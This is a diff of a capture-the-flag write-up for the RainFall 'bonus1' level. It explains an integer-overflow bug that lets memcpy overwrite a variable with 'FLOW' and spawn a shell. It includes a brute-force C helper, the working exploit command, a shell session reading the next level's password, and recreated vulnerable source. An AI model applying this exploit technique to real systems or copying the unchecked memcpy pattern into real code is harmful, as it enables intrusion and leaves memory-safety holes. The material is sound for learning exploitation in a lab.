@@ -1,18 +1,85 @@
+# ------------------------------------------------------------------------
+# analysis
+# ------------------------------------------------------------------------
+
 the program converts argv[1] to int using atoi(), stores it in variable `k'
 if k is less than 10, the program copies k*4 characters from argv[2] into buffer `buf'
 by making k a negative number we can pass first condition (k < 10)
 our negative number must turn positive when multiplied by 4,
-k*4 should be greater or equal to 44, because bytes [40:44] of argv[2] will overwrite k
+k*4 should be greater or equal to 44, because bytes [40:44] of argv[2] will overwrite k,
+and we want k to become 0x574f4c46 - the four bytes in string "FLOW"
 number is easily found via bruteforce search, -1073741813 is one such number
 then program compares k to 0x574f4c46 and if they're equal it executes /bin/sh
 we can overwrite k using argv[2] bytes [40:44] must be hex: 46 4c 4f 57 or ascii 'FLOW'
 
+# ------------------------------------------------------------------------
+# exploit
+# ------------------------------------------------------------------------
 
-bonus1@RainFall:/tmp$ python -c "print('FLOW'*11)"
-FLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOW
-bonus1@RainFall:/tmp$ /home/user/bonus1/bonus1 -1073741813 FLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOW
-$ whoami
-bonus2
-$ cat /home/user/bonus2/.pass
-579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
-$ 
+finding a good number is easily accomplished by a bruteforce program:
+
+
+#include <stdio.h>
+#include <limits.h>
+
+int main()
+{
+    for (int i=-1; i > INT_MIN ; i--) {
+        int x = i * 4;
+        if (x >= 44 && x < 50) {
+            printf("i = %d, j = 4, i*j = %d\n", i, x);
+        }
+    }
+    return 0;
+}
+
+
+outputs:
+    i = -1073741812, j = 4, i*j = 48
+    i = -1073741813, j = 4, i*j = 44
+    i = -2147483636, j = 4, i*j = 48
+    i = -2147483637, j = 4, i*j = 44
+
+so we can use one of those numbers as our argv[1] parameters
+
+our argv2 parameter will be:    
+    FLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOW
+
+as long as bytes[40:44] are 0x46, 0x4c, 0x4f, 0x57 it should work
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaFLOWzzzzzzz     << bytes [40:44] overwrite k
+
+and when we try that:
+    bonus1@RainFall:/tmp$ /home/user/bonus1/bonus1 -1073741813 FLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOW
+    $ whoami
+    bonus2
+    $ cat /home/user/bonus2/.pass
+    579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+# ------------------------------------------------------------------------
+# recreating the executable
+# ------------------------------------------------------------------------
+
+/* compile: 	gcc -fno-stack-protector source.c 	*/
+
+#include <stdlib.h>	/* atoi */
+#include <unistd.h>	/* execl */
+#include <string.h>	/* memcpy */
+
+int main(int argc, char **argv)
+{
+	char	buf[40];
+	int	k;
+
+	k = atoi(argv[1]);
+	if (k < 10) {
+
+		memcpy(buf, argv[2], k*4);
+		if (k == 0x574f4c46) {
+				execl("/bin/sh", "sh", NULL);
+		}
+
+	} else {
+		return 1;
+	}
+	return 0;
+}
